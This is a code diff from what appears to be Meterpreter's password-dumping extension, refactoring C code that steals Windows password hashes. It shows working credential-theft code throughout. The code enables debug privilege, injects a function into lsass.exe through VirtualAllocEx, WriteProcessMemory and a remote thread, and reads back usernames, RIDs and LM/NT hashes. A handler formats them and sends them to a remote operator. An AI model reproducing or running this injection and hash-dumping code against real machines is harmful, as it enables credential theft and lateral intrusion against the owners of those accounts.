-	strncpy_s(fargs->realloc, sizeof(fargs->realloc), "realloc", sizeof(fargs->realloc));
-	strncpy_s(fargs->free, sizeof(fargs->free), "free", sizeof(fargs->free));
-	strncpy_s(fargs->memcpy, sizeof(fargs->memcpy), "memcpy", sizeof(fargs->memcpy));
-
-	/* initialize ntdll strings */
-	strncpy_s(fargs->ntdlldll, sizeof(fargs->ntdlldll), "ntdll.dll", sizeof(fargs->ntdlldll));
-	strncpy_s(fargs->wcstombs, sizeof(fargs->wcstombs), "wcstombs", sizeof(fargs->wcstombs));
-
-	/* initialize kernel sync objects */
-	strncpy_s(fargs->ReadSyncEvent, sizeof(fargs->ReadSyncEvent), "SAM", sizeof(fargs->ReadSyncEvent));
-	strncpy_s(fargs->FreeSyncEvent, sizeof(fargs->FreeSyncEvent), "FREE", sizeof(fargs->FreeSyncEvent));
-
-	/* initialize wait time */
-	fargs->dwMillisecondsToWait = dwMillisecondsToWait;
-
-	/* initailize variables */
-	fargs->dwDataSize = 0;
-	fargs->pUsernameHashData = NULL;
-
-	/* clean up */
-	CloseHandle(hLibrary);
-
-	return 0;
+	return dwResult;
 }
 
-/* 
-control function driving the dumping - return 0 on success, 1 on error 
-
-dwMillisecondsToWait = basically controls how long to wait for the results
+/*!
+ * @brief Function driving the SAM dumping.
+ * @param dwMillisecondsToWait How long to wait for the results before giving up.
+ * @param hashresults Pointer that will receive the hash dump results.
+ * @returns Indication of success or failure.
 */
-int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults) {
-
+DWORD __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults)
+{
 	HANDLE hThreadHandle = NULL, hLsassHandle = NULL, hReadLock = NULL, hFreeLock = NULL;
 	LPVOID pvParameterMemory = NULL, pvFunctionMemory = NULL;
-	int FunctionSize;
+	DWORD_PTR dwFunctionSize;
 	SIZE_T sBytesWritten = 0, sBytesRead = 0;
-	DWORD dwThreadId = 0, dwNumberOfUsers = 0, dwCurrentUserIndex = 0, HashIndex = 0;
+	DWORD dwNumberOfUsers = 0, dwCurrentUserIndex = 0, HashIndex = 0;
 	FUNCTIONARGS InitFunctionArguments, FinalFunctionArguments;
 	USERNAMEHASH *UsernameHashResults = NULL;
 	PVOID UsernameAddress = NULL;
@@ -487,170 +744,285 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 	char buffer[100];
 	/* END METERPRETER CODE */
 
-	do {
+	do
+	{
 
 		/* ORANGE control input - move this to the client perl side */
-		if (dwMillisecondsToWait < 60000) { dwMillisecondsToWait = 60000; }
-		if (dwMillisecondsToWait > 300000) { dwMillisecondsToWait = 300000; }
+		if (dwMillisecondsToWait < 60000)
+		{
+			dwMillisecondsToWait = 60000;
+		}
+		if (dwMillisecondsToWait > 300000)
+		{
+			dwMillisecondsToWait = 300000;
+		}
 
 		/* create the event kernel sync objects */
-		hReadLock = CreateEvent(NULL, FALSE, FALSE, "SAM");
-		hFreeLock = CreateEvent(NULL, FALSE, FALSE, "FREE");
-		if (!hReadLock || !hFreeLock) { dwError = 1; break; }
+		hReadLock = CreateEvent(NULL, FALSE, FALSE, READ_SYNC_EVENT_NAME);
+		hFreeLock = CreateEvent(NULL, FALSE, FALSE, FREE_SYNC_EVENT_NAME);
+
+		if (!hReadLock || !hFreeLock)
+		{
+			dwError = GetLastError();
+			break;
+		}
 
 		/* calculate the function size */
-		FunctionSize = (DWORD)sizer - (DWORD)dumpSAM;
-		if (FunctionSize <= 0) {
-			dprintf("Error calculating the function size.\n");
-			dwError = 1;
+		if ((DWORD_PTR)dump_sam >= (DWORD_PTR)sizer)
+		{
+			dprintf("Error calculating the function size.");
+			dwError = ERROR_INVALID_PARAMETER;
 			break;
 		}
 
-		/* set access priv */
-		if (SetAccessPriv() == 0) {
-			dprintf("Error setting SE_DEBUG_NAME privilege\n");
-			dwError = 1;
+		dwFunctionSize = (DWORD_PTR)sizer - (DWORD_PTR)dump_sam;
+
+		if ((dwError = set_access_priv()) != ERROR_SUCCESS)
+		{
+			dprintf("Error setting SE_DEBUG_NAME privilege: %u (%x)");
 			break;
 		}
 
-		/* get the lsass handle */
-		hLsassHandle = GetLsassHandle();
-		if (hLsassHandle == 0) {
-			dprintf("Error getting lsass.exe handle.\n");
-			dwError = 1;
+		hLsassHandle = get_lsass_handle();
+		if (hLsassHandle == 0)
+		{
+			dwError = ERROR_INVALID_PARAMETER;
+			dprintf("Error getting lsass.exe handle.");
 			break;
 		}
 
 		/* set the arguments in the context structure */
-		if (setArgs(&InitFunctionArguments, dwMillisecondsToWait)) { dwError = 1; break; }
+		if ((dwError = setup_dump_sam_arguments(&InitFunctionArguments, dwMillisecondsToWait)) != ERROR_SUCCESS)
+		{
+			dprintf("[PASSWD] Unable to set arguments %u (%x)", dwError, dwError);
+			break;
+		}
 
 		/* allocate memory for the context structure */
 		pvParameterMemory = VirtualAllocEx(hLsassHandle, NULL, sizeof(FUNCTIONARGS), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-		if (pvParameterMemory == NULL) { dwError = 1; break; }
+		if (pvParameterMemory == NULL)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Failed to allocat memory %u (%x)", dwError, dwError);
+			break;
+		}
 
 		/* write context structure into remote process */
-		if (WriteProcessMemory(hLsassHandle, pvParameterMemory, &InitFunctionArguments, sizeof(InitFunctionArguments), &sBytesWritten) == 0) { dwError = 1; break; }
-		if (sBytesWritten != sizeof(InitFunctionArguments)) { dwError = 1; break; }
+		if (WriteProcessMemory(hLsassHandle, pvParameterMemory, &InitFunctionArguments, sizeof(InitFunctionArguments), &sBytesWritten) == 0)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Failed to write process memory for function args %u (%x)", dwError, dwError);
+			break;
+		}
+		if (sBytesWritten != sizeof(InitFunctionArguments))
+		{
+			dwError = 1;
+			break;
+		}
 		sBytesWritten = 0;
 
 		/* allocate memory for the function */
-		pvFunctionMemory = VirtualAllocEx(hLsassHandle, NULL, FunctionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-		if (pvFunctionMemory == NULL) { dwError = 1; break; }
+		pvFunctionMemory = VirtualAllocEx(hLsassHandle, NULL, dwFunctionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (pvFunctionMemory == NULL)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Failed to allocate process memory %u (%x)", dwError, dwError);
+			break;
+		}
 
 		/* write the function into the remote process */
-		if (WriteProcessMemory(hLsassHandle, pvFunctionMemory, dumpSAM, FunctionSize, &sBytesWritten) == 0) { dwError = 1; break; }
-		if (sBytesWritten != FunctionSize) { dwError = 1; break; }
+		if (WriteProcessMemory(hLsassHandle, pvFunctionMemory, dump_sam, dwFunctionSize, &sBytesWritten) == 0)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Failed to write process memory for function body %u (%x)", dwError, dwError);
+			break;
+		}
+
+		if (sBytesWritten != dwFunctionSize)
+		{
+			dwError = 1;
+			break;
+		}
 		sBytesWritten = 0;
 
 		/* start the remote thread */
-		if ((hThreadHandle = CreateRemoteThread(hLsassHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pvFunctionMemory, pvParameterMemory, 0, &dwThreadId)) == NULL) { dwError = 1; break; }
-		
+		if ((hThreadHandle = create_remote_thread(hLsassHandle, pvFunctionMemory, pvParameterMemory)) == NULL)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Failed to create remote thread %u (%x)", dwError, dwError);
+			break;
+		}
+
 		/* wait until the data is ready to be collected */
-		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0) {
-			dprintf("Timed out waiting for the data to be collected.\n");
-			dwError = 1;
+		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Timed out waiting for the data to be collected: %u (%x)", dwError, dwError);
 			break;
 		}
 
 		/* read results of the injected function */
-		if (ReadProcessMemory(hLsassHandle, pvParameterMemory, &FinalFunctionArguments, sizeof(InitFunctionArguments), &sBytesRead) == 0) { dwError = 1; break; }
-		if (sBytesRead != sizeof(InitFunctionArguments)) { dwError = 1; break; }
+		if (ReadProcessMemory(hLsassHandle, pvParameterMemory, &FinalFunctionArguments, sizeof(InitFunctionArguments), &sBytesRead) == 0)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Failed to read process memory to get result: %u (%x)", dwError, dwError);
+			break;
+		}
+		if (sBytesRead != sizeof(InitFunctionArguments))
+		{
+			dwError = 1;
+			break;
+		}
 		sBytesRead = 0;
 
 		/* allocate space for the results */
 		UsernameHashResults = (USERNAMEHASH *)malloc(FinalFunctionArguments.dwDataSize);
-		if (UsernameHashResults == NULL) { dwError = 1; break; }
+		if (UsernameHashResults == NULL)
+		{
+			dwError = 1;
+			break;
+		}
 
 		/* determine the number of elements and copy over the data */
 		dwNumberOfUsers = FinalFunctionArguments.dwDataSize / sizeof(USERNAMEHASH);
 
 		/* copy the context structure */
-		if (ReadProcessMemory(hLsassHandle, FinalFunctionArguments.pUsernameHashData, UsernameHashResults, FinalFunctionArguments.dwDataSize, &sBytesRead) == 0) { break; }
-		if (sBytesRead != FinalFunctionArguments.dwDataSize) { break; }
+		if (ReadProcessMemory(hLsassHandle, FinalFunctionArguments.pUsernameHashData, UsernameHashResults, FinalFunctionArguments.dwDataSize, &sBytesRead) == 0)
+		{
+			dwError = GetLastError();
+			dprintf("[PASSWD] Failed to read process memory to get hashresults: %u (%x)", dwError, dwError);
+			break;
+		}
+		if (sBytesRead != FinalFunctionArguments.dwDataSize)
+		{
+			break;
+		}
 		sBytesRead = 0;
 
 		// save the old mem addy, malloc new space, copy over the data, free the old mem addy
-		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {
+		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++)
+		{
 			UsernameAddress = UsernameHashResults[dwCurrentUserIndex].Username;
-			
-			UsernameHashResults[dwCurrentUserIndex].Username = (char *)malloc(UsernameHashResults[dwCurrentUserIndex].Length + 1);
-			if (UsernameHashResults[dwCurrentUserIndex].Username == NULL) { dwError = 1; break; }
 
-			if (ReadProcessMemory(hLsassHandle, UsernameAddress, UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].Length, &sBytesRead) == 0) { dwError = 1; break; }
-			if (sBytesRead != UsernameHashResults[dwCurrentUserIndex].Length) { dwError = 1; break; }
-			UsernameHashResults[dwCurrentUserIndex].Username[  UsernameHashResults[dwCurrentUserIndex].Length ] = 0;
+			UsernameHashResults[dwCurrentUserIndex].Username = (char *)malloc(UsernameHashResults[dwCurrentUserIndex].Length + 1);
+			if (UsernameHashResults[dwCurrentUserIndex].Username == NULL)
+			{
+				dwError = 1;
+				break;
+			}
+
+			if (ReadProcessMemory(hLsassHandle, UsernameAddress, UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].Length, &sBytesRead) == 0)
+			{
+				dwError = 1;
+				break;
+			}
+			if (sBytesRead != UsernameHashResults[dwCurrentUserIndex].Length)
+			{
+				dwError = 1;
+				break;
+			}
+			UsernameHashResults[dwCurrentUserIndex].Username[UsernameHashResults[dwCurrentUserIndex].Length] = 0;
 		}
 
 		/* signal that all data has been read and wait for the remote memory to be free'd */
-		if (SetEvent(hFreeLock) == 0) { dwError = 1; break; }
-		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0) {
+		if (SetEvent(hFreeLock) == 0)
+		{
+			dwError = 1;
+			break;
+		}
+		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0)
+		{
 			dprintf("The timeout hit.\n");
 			dwError = 1;
 			break;
 		}
 
 		/* display the results and free the malloc'd memory for the username */
-		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {
+		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++)
+		{
 
 			/* METERPRETER CODE */
-			hashstring = StringCombine(hashstring, UsernameHashResults[dwCurrentUserIndex].Username);
-			hashstring = StringCombine(hashstring, ":");
+			hashstring = string_combine(hashstring, UsernameHashResults[dwCurrentUserIndex].Username);
+			hashstring = string_combine(hashstring, ":");
 			_snprintf_s(buffer, sizeof(buffer), 30, "%d", UsernameHashResults[dwCurrentUserIndex].RID);
-			hashstring = StringCombine(hashstring, buffer);
-			hashstring = StringCombine(hashstring, ":");
+			hashstring = string_combine(hashstring, buffer);
+			hashstring = string_combine(hashstring, ":");
 			/* END METERPRETER CODE */
 
 			//printf("%s:%d:", UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].RID);
-			for (HashIndex = 16; HashIndex < 32; HashIndex++) {
-				/* ORANGE - insert check for ***NO PASSWORD***		
+			for (HashIndex = 16; HashIndex < 32; HashIndex++)
+			{
+				/* ORANGE - insert check for ***NO PASSWORD***
 					if( (regData[4] == 0x35b4d3aa) && (regData[5] == 0xee0414b5)
-                    && (regData[6] == 0x35b4d3aa) && (regData[7] == 0xee0414b5) )
-                    sprintf( LMdata, "NO PASSWORD*********************" );
-				*/
+					&& (regData[6] == 0x35b4d3aa) && (regData[7] == 0xee0414b5) )
+					sprintf( LMdata, "NO PASSWORD*********************" );
+					*/
 				_snprintf_s(buffer, sizeof(buffer), 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
-				hashstring = StringCombine(hashstring, buffer);
+				hashstring = string_combine(hashstring, buffer);
 				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
 			}
-			hashstring = StringCombine(hashstring, ":");
+			hashstring = string_combine(hashstring, ":");
 			//printf(":");
-			for (HashIndex = 0; HashIndex < 16; HashIndex++) {
+			for (HashIndex = 0; HashIndex < 16; HashIndex++)
+			{
 				/* ORANGE - insert check for ***NO PASSWORD***
 					if( (regData[0] == 0xe0cfd631) && (regData[1] == 0x31e96ad1)
-                    && (regData[2] == 0xd7593cb7) && (regData[3] == 0xc089c0e0) )
-                    sprintf( NTdata, "NO PASSWORD*********************" );
-				*/
+					&& (regData[2] == 0xd7593cb7) && (regData[3] == 0xc089c0e0) )
+					sprintf( NTdata, "NO PASSWORD*********************" );
+					*/
 				_snprintf_s(buffer, sizeof(buffer), 3, "%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
-				hashstring = StringCombine(hashstring, buffer);
+				hashstring = string_combine(hashstring, buffer);
 				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
 			}
 
-			hashstring = StringCombine(hashstring, ":::\n");
+			hashstring = string_combine(hashstring, ":::\n");
 			//printf(":::\n");
 		}
-	} while(0);
+	} while (0);
 
 	/* relesase the event objects */
-	if (hReadLock) { CloseHandle(hReadLock); }
-	if (hFreeLock) { CloseHandle(hFreeLock); }
+	if (hReadLock)
+	{
+		CloseHandle(hReadLock);
+	}
+	if (hFreeLock)
+	{
+		CloseHandle(hFreeLock);
+	}
 
 	/* close handle to lsass */
-	if (hLsassHandle) { CloseHandle(hLsassHandle); }
+	if (hLsassHandle)
+	{
+		CloseHandle(hLsassHandle);
+	}
 
 	/* free the context structure and the injected function and the results */
-	if (pvParameterMemory) { VirtualFreeEx(hLsassHandle, pvParameterMemory, sizeof(FUNCTIONARGS), MEM_RELEASE); }
-	if (pvFunctionMemory) { VirtualFreeEx(hLsassHandle, pvFunctionMemory, FunctionSize, MEM_RELEASE); }
+	if (pvParameterMemory)
+	{
+		VirtualFreeEx(hLsassHandle, pvParameterMemory, sizeof(FUNCTIONARGS), MEM_RELEASE);
+	}
+	if (pvFunctionMemory)
+	{
+		VirtualFreeEx(hLsassHandle, pvFunctionMemory, dwFunctionSize, MEM_RELEASE);
+	}
 
 	/* free the remote thread handle */
-	if (hThreadHandle) { CloseHandle(hThreadHandle); }
+	if (hThreadHandle)
+	{
+		CloseHandle(hThreadHandle);
+	}
 
 	/* free the results structure including individually malloced space for usernames */
-	if (UsernameHashResults) { 
-		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {
-			if (UsernameHashResults[dwCurrentUserIndex].Username) {
+	if (UsernameHashResults)
+	{
+		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++)
+		{
+			if (UsernameHashResults[dwCurrentUserIndex].Username)
+			{
 				free(UsernameHashResults[dwCurrentUserIndex].Username);
 			}
 		}
-		free(UsernameHashResults); 
+		free(UsernameHashResults);
 	}
 
 	/* return hashresults */
@@ -660,8 +1032,11 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 	return dwError;
 }
 
-/*
- * Grabs the LanMan Hashes from the SAM database.
+/*!
+ * @brief Handler called by Meterpreter to dump SAM hashes remotely.
+ * @param remote Pointer to the \c Remote instance for this request.
+ * @param packet Pointer to the \c Packet containing the request.
+ * @returns Indication of success or failure.
  */
 DWORD request_passwd_get_sam_hashes(Remote *remote, Packet *packet)
 {
@@ -671,10 +1046,10 @@ DWORD request_passwd_get_sam_hashes(Remote *remote, Packet *packet)
 
 	do
 	{
+		dprintf("[PASSWD] starting hash dumping");
 		// Get the hashes
-		if (control(120000, &hashes))
+		if ((res = control(120000, &hashes)) != ERROR_SUCCESS)
 		{
-			res = GetLastError();
 			break;
 		}
 
@@ -685,7 +1060,9 @@ DWORD request_passwd_get_sam_hashes(Remote *remote, Packet *packet)
 	packet_transmit_response(res, remote, response);
 
 	if (hashes)
+	{
 		free(hashes);
+	}
 
 	return res;
 }
